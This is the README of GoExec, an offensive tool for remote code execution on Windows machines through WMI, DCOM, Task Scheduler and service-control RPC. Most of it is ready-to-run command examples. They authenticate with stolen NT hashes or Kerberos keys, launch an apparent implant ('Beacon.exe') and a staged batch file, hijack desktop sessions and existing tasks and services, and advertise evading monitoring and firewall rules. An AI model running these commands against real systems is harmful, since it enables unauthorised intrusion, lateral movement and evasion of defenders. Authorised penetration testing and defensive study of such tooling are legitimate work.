# GoExec - Remote Execution Multitool

![goexec](https://github.com/user-attachments/assets/16782082-5a42-477c-95e2-46295bbe3c34)

GoExec is a new take on some of the methods used to gain remote execution on Windows devices. GoExec implements a number of largely unrealized execution methods and provides significant OPSEC improvements overall.

The original post about GoExec v0.1.0 can be found [here](https://www.falconops.com/blog/introducing-goexec)

## Installation

### Build & Install with Go

To build this project from source, you will need Go version 1.23.* or greater and a 64-bit target architecture. More information on managing Go installations can be found [here](https://go.dev/doc/manage-install)

```shell
# Install goexec
go install -ldflags="-s -w" github.com/FalconOpsLLC/goexec@latest
```

#### Manual Installation

For pre-release features, fetch the latest commit and build manually.

```shell
# (Linux) Install GoExec manually from source
# Fetch source
git clone https://github.com/FalconOpsLLC/goexec
cd goexec

# Build goexec (Go >= 1.23)
CGO_ENABLED=0 go build -ldflags="-s -w"

# (Optional) Install goexec to /usr/local/bin/goexec
sudo install ./goexec /usr/local/bin
```

### Install from Release

You may also download [the latest release](https://github.com/FalconOpsLLC/goexec/releases/latest) for 64-bit Windows, macOS, or Linux.

## Usage

GoExec is made up of modules for each remote service used (i.e. `wmi`, `scmr`, etc.), and specific methods within each module (i.e. `wmi proc`, `scmr change`, etc.)

```text
Usage:
  goexec [command] [flags]

Execution Commands:
  dcom        Execute with Distributed Component Object Model (MS-DCOM)
  wmi         Execute with Windows Management Instrumentation (MS-WMI)
  scmr        Execute with Service Control Manager Remote (MS-SCMR)
  tsch        Execute with Windows Task Scheduler (MS-TSCH)

Additional Commands:
  help        Help about any command
  completion  Generate the autocompletion script for the specified shell

Logging:
  -D, --debug           Enable debug logging
  -O, --log-file file   Write JSON logging output to file
  -j, --json            Write logging output in JSON lines
  -q, --quiet           Disable info logging

Authentication:
  -u, --user user@domain      Username ('user@domain', 'domain\user', 'domain/user' or 'user')
  -p, --password string       Password
  -H, --nt-hash hash          NT hash ('NT', ':NT' or 'LM:NT')
      --aes-key hex key       Kerberos AES hex key
      --pfx file              Client certificate and private key as PFX file
      --pfx-password string   Password for PFX file
      --ccache file           Kerberos CCache file name (defaults to $KRB5CCNAME, currently unset)
      --dc string             Domain controller
  -k, --kerberos              Use Kerberos authentication

Use "goexec [command] --help" for more information about a command.
```

### Fetching Remote Process Output

Although not recommended for live engagements or monitored environments due to OPSEC concerns, we've included the optional ability to fetch program output via SMB file transfer with the `-o` flag. Use of this flag will wrap the supplied command in `cmd.exe /c ... > \Windows\Temp\RANDOM` where `RANDOM` is a random GUID, then fetch the output file via SMB file transfer.

### WMI Module (`wmi`)

The `wmi` module uses remote Windows Management Instrumentation (WMI) to spawn processes (`wmi proc`), or manually call a method (`wmi call`).

```text
Usage:
  goexec wmi [command] [flags]

Available Commands:
  proc        Start a Windows process
  call        Execute specified WMI method

... [inherited flags] ...

Network:
  -x, --proxy URI           Proxy URI
  -F, --epm-filter string   String binding to filter endpoints returned
                            by the RPC endpoint mapper (EPM)
      --endpoint string     Explicit RPC endpoint definition
      --no-epm              Do not use EPM to automatically detect RPC
                            endpoints
      --no-sign             Disable signing on DCERPC messages
      --no-seal             Disable packet stub encryption on DCERPC messages
```

#### Process Creation Method (`wmi proc`)

The `proc` method creates an instance of the `Win32_Process` WMI class, then calls the `Create` method to spawn a process with the provided arguments.

```text
Usage:
  goexec wmi proc [target] [flags]

Execution:
  -e, --exec string         Remote Windows executable to invoke
  -a, --args string         Process command line arguments
  -c, --command string      Windows process command line (executable &
                            arguments)
  -o, --out string          Fetch execution output to file or "-" for
                            standard output
  -m, --out-method string   Method to fetch execution output (default "smb")
      --no-delete-out       Preserve output file on remote filesystem
  -d, --directory string    Working directory (default "C:\\")

... [inherited flags] ...
```

##### Examples

```shell
# Run an executable without arguments
./goexec wmi proc "$target" \
  -u "$auth_user" \
  -p "$auth_pass" \
  -e 'C:\Windows\Temp\Beacon.exe' \

# Authenticate with NT hash, fetch output from `cmd.exe /c whoami /all`
./goexec wmi proc "$target" \
  -u "$auth_user" \
  -H "$auth_nt" \
  -e 'cmd.exe' \
  -a '/C whoami /all' \
  -o- # Fetch output to STDOUT
```

#### (Auxiliary) Call Method (`wmi call`)

The `call` method gives the operator full control over a WMI method call. You can list available classes and methods on Windows with PowerShell's [`Get-CimClass`](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/get-cimclass?view=powershell-7.5).

```text
Usage:
  goexec wmi call [target] [flags]

WMI:
  -n, --namespace string   WMI namespace (default "//./root/cimv2")
  -C, --class string       WMI class to instantiate (i.e. "Win32_Process")
  -m, --method string      WMI Method to call (i.e. "Create")
  -A, --args string        WMI Method argument(s) in JSON dictionary format (i.e. {"Command":"calc.exe"}) (default "{}")

... [inherited flags] ...
```

##### Examples

```shell
# Call StdRegProv.EnumKey - enumerate registry subkeys of HKLM\SYSTEM
./goexec wmi call "$target" \
    -u "$auth_user" \
    -p "$auth_pass" \
    -C 'StdRegProv' \
    -m 'EnumKey' \
    -A '{"sSubKeyName":"SYSTEM"}'
```

### DCOM Module (`dcom`)

The `dcom` module uses exposed Distributed Component Object Model (DCOM) objects to spawn processes.

```text
Usage:
  goexec dcom [command] [flags]

... [inherited flags] ...

Network:
  -x, --proxy URI           Proxy URI
  -F, --epm-filter string   String binding to filter endpoints returned
                            by the RPC endpoint mapper (EPM)
      --endpoint string     Explicit RPC endpoint definition
      --no-epm              Do not use EPM to automatically detect RPC
                            endpoints
      --no-sign             Disable signing on DCERPC messages
      --no-seal             Disable packet stub encryption on DCERPC messages
```

#### `MMC20.Application` Method (`dcom mmc`)

The `mmc` method uses the exposed `MMC20.Application` object to call `Document.ActiveView.ShellExec`, and ultimately spawn a process on the remote host.

```text
Usage:
  goexec dcom mmc [target] [flags]

Execution:
  -e, --exec string           Remote Windows executable to invoke
  -a, --args string           Process command line arguments
  -c, --command string        Windows process command line (executable &
                              arguments)
  -o, --out string            Fetch execution output to file or "-" for
                              standard output
  -m, --out-method string     Method to fetch execution output (default "smb")
      --no-delete-out         Preserve output file on remote filesystem
      --directory directory   Working directory (default "C:\\")
      --window string         Window state (default "Minimized")

... [inherited flags] ...
```

##### Examples

```shell
# Authenticate with NT hash, fetch output from `cmd.exe /c whoami /priv` to file
./goexec dcom mmc "$target" \
  -u "$auth_user" \
  -H "$auth_nt" \
  -e 'cmd.exe' \
  -a '/c whoami /priv' \
  -o ./privs.bin # Save output to ./privs.bin
```

### Task Scheduler Module (`tsch`)

The `tsch` module makes use of the Windows Task Scheduler service ([MS-TSCH](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/)) to spawn processes on the remote target.

```text
Usage:
  goexec tsch [command] [flags]

Available Commands:
  demand      Register a remote scheduled task and demand immediate start
  create      Create a remote scheduled task with an automatic start time
  change      Modify an existing task to spawn an arbitrary process

... [inherited flags] ...

Network:
  -x, --proxy URI           Proxy URI
  -F, --epm-filter string   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
      --endpoint string     Explicit RPC endpoint definition
      --no-epm              Do not use EPM to automatically detect RPC endpoints
      --no-sign             Disable signing on DCERPC messages
      --no-seal             Disable packet stub encryption on DCERPC messages
```

#### Create Scheduled Task (`tsch create`)


The `create` method registers a scheduled task using [SchRpcRegisterTask](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/849c131a-64e4-46ef-b015-9d4c599c5167) with an automatic start time via [TimeTrigger](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/385126bf-ed3a-4131-8d51-d88b9c00cfe9), and optional automatic deletion with the [DeleteExpiredTaskAfter](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/6bfde6fe-440e-4ddd-b4d6-c8fc0bc06fae) setting.

```text
Usage:
  goexec tsch create [target] [flags]

Task Scheduler:
  -t, --task string            Name or path of the new task
      --delay-stop duration    Delay between task execution and termination. This won't stop the spawned process (default 5s)
      --start-delay duration   Delay between task registration and execution (default 5s)
      --no-delete              Don't delete task after execution
      --call-delete            Directly call SchRpcDelete to delete task
      --sid SID                User SID to impersonate (default "S-1-5-18")

Execution:
  -e, --exec string         Remote Windows executable to invoke
  -a, --args string         Process command line arguments
  -c, --command string      Windows process command line (executable & arguments)
  -o, --out string          Fetch execution output to file or "-" for standard output
  -m, --out-method string   Method to fetch execution output (default "smb")
      --no-delete-out       Preserve output file on remote filesystem

... [inherited flags] ...
```

##### Examples

```shell
# Authenticate with NT hash via Kerberos, register task at \Microsoft\Windows\GoExec, execute `C:\Windows\Temp\Beacon.exe`
./goexec tsch create "$target" \
  --user "${auth_user}@${domain}" \
  --nt-hash "$auth_nt" \
  --dc "$dc_ip" \
  --kerberos \
  --task '\Microsoft\Windows\GoExec' \
  --exec 'C:\Windows\Temp\Beacon.exe'
```

#### Create Scheduled Task & Demand Start (`tsch demand`)

Similar to the `create` method, the `demand` method will call `SchRpcRegisterTask`, but rather than setting a defined time when the task will start, it will additionally call `SchRpcRun` to forcefully start the task. This method can additionally hijack desktop sessions when provided the session ID with `--session`.

```text
Usage:
  goexec tsch demand [target] [flags]

Task Scheduler:
  -t, --task string      Name or path of the new task
      --session uint32   Hijack existing session given the session ID
      --sid string       User SID to impersonate (default "S-1-5-18")
      --no-delete        Don't delete task after execution

Execution:
  -e, --exec string         Remote Windows executable to invoke
  -a, --args string         Process command line arguments
  -c, --command string      Windows process command line (executable & arguments)
  -o, --out string          Fetch execution output to file or "-" for standard output
  -m, --out-method string   Method to fetch execution output (default "smb")
      --no-delete-out       Preserve output file on remote filesystem

... [inherited flags] ...
```

##### Examples

```shell
# Use random task name, execute `notepad.exe` on desktop session 1
./goexec tsch demand "$target" \
  --user "$auth_user" \
  --password "$auth_pass" \
  --exec 'notepad.exe' \
  --session 1

# Authenticate with NT hash via Kerberos,
#   register task at \Microsoft\Windows\GoExec (will be deleted),
#   execute `C:\Windows\System32\cmd.exe /c set` with output
./goexec tsch demand "$target" \
  --user "${auth_user}@${domain}" \
  --nt-hash "$auth_nt" \
  --dc "$dc_ip" \
  --kerberos \
  --task '\Microsoft\Windows\GoExec' \
  --exec 'C:\Windows\System32\cmd.exe' \
  --args '/c set' \
  --out -
```

#### Modify Scheduled Task Definition (`tsch change`)

The `change` method calls `SchRpcRetrieveTask` to fetch the definition of an existing
task (`-t`/`--task`), then modifies the task definition to spawn a process before restoring the original.

```text
Usage:
  goexec tsch change [target] [flags]

Task Scheduler:
  -t, --task string   Path to existing task
      --no-start      Don't start the task
      --no-revert     Don't restore the original task definition

Execution:
  -e, --exec string         Remote Windows executable to invoke
  -a, --args string         Process command line arguments
  -c, --command string      Windows process command line (executable & arguments)
  -o, --out string          Fetch execution output to file or "-" for standard output
  -m, --out-method string   Method to fetch execution output (default "smb")
      --no-delete-out       Preserve output file on remote filesystem

... [inherited flags] ...
```

##### Examples

```shell
# Enable debug logging, Modify "\Microsoft\Windows\UPnP\UPnPHostConfig" to run `cmd.exe /c whoami /all` with output
./goexec tsch change $target --debug \
  -u "${auth_user}" \
  -p "${auth_pass}" \
  -t '\Microsoft\Windows\UPnP\UPnPHostConfig' \
  -e 'cmd.exe' \
  -a '/C whoami /all' \
  -o >(tr -d '\r') # Send output to another program (zsh/bash)
```

### SCMR Module (`scmr`)

The SCMR module works a lot like [`smbexec.py`](https://github.com/fortra/impacket/blob/master/examples/smbexec.py), but it provides additional RPC transports to evade network monitoring or firewall rules, and some minor OPSEC improvements overall.

> [!WARNING]
> The `scmr` module cannot fetch process output at the moment. This will be added in a future release.

```text
Usage:
  goexec scmr [command] [flags]

Available Commands:
  create      Spawn a remote process by creating & running a Windows service
  change      Change an existing Windows service to spawn an arbitrary process
  delete      Delete an existing Windows service

... [inherited flags] ...

Network:
  -x, --proxy URI           Proxy URI
  -F, --epm-filter string   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
      --endpoint string     Explicit RPC endpoint definition
      --no-epm              Do not use EPM to automatically detect RPC endpoints
      --no-sign             Disable signing on DCERPC messages
      --no-seal             Disable packet stub encryption on DCERPC messages
```

#### Create Service (`scmr create`)

The `create` method is used to spawn a process by creating a Windows service. This method requires the full path to a remote executable (i.e. `C:\Windows\System32\calc.exe`)

```text
Usage:
  goexec scmr create [target] [flags]

Execution:
  -f, --executable-path string   Full path to a remote Windows executable
  -a, --args string              Arguments to pass to the executable

Service:
  -n, --display-name string   Display name of service to create
  -s, --service string        Name of service to create
      --no-delete             Don't delete service after execution
      --no-start              Don't start service
```

##### Examples

```shell
# Use MSRPC instead of SMB, use custom service name, execute `cmd.exe`
./goexec scmr create "$target" \
  -u "${auth_user}@${domain}" \
  -p "$auth_pass" \
  -f 'C:\Windows\System32\cmd.exe' \
  -F 'ncacn_ip_tcp:'

# Directly dial svcctl named pipe ("ncacn_np:[svcctl]"),
#   use random service name,
#   execute `C:\Windows\System32\calc.exe` 
./goexec scmr create "$target" \
  -u "${auth_user}@${domain}" \
  -p "$auth_pass" \
  -f 'C:\Windows\System32\calc.exe' \
  --endpoint 'ncacn_np:[svcctl]' --no-epm
```

#### Modify Service (`scmr change`)

The SCMR module's `change` method executes programs by modifying existing Windows services using the RChangeServiceConfigW method rather than calling RCreateServiceW like `scmr create`. The modified service is restored to its original state after execution

> [!WARNING]
> Using this module on important Windows services may brick the OS. Try using a less important service like `PlugPlay`.

```text
Usage:
  goexec scmr change [target] [flags]

Service Control:
  -s, --service-name string   Name of service to modify
      --no-start              Don't start service

Execution:
  -f, --executable-path string   Full path to remote Windows executable
  -a, --args string              Arguments to pass to executable
```

##### Examples

```shell
# Used named pipe transport, Modify the PlugPlay service to execute `C:\Windows\System32\cmd.exe /c C:\Windows\Temp\stage.bat`
./goexec scmr change $target \
  -u "$auth_user" \
  -p "$auth_pass" \
  -F "ncacn_np:" \
  -s PlugPlay \
  -f 'C:\Windows\System32\cmd.exe' \
  -a '/c C:\Windows\Temp\stage.bat'
```

#### (Auxiliary) Delete Service

The SCMR module's auxiliary `delete` method will simply delete the provided service.

```text
Usage:
  goexec scmr delete [target] [flags]

Service Control:
  -s, --service-name string   Name of service to delete
```

## Acknowledgements

- [@oiweiwei](https://github.com/oiweiwei) for the wonderful [go-msrpc](https://github.com/oiweiwei/go-msrpc) module
- [@RedTeamPentesting](https://github.com/RedTeamPentesting) and [Erik Geiser](https://github.com/rtpt-erikgeiser) for the [adauth](https://github.com/RedTeamPentesting/adauth) module
- The developers and contributors of [Impacket](https://github.com/fortra/impacket) for the inspiration and technical reference
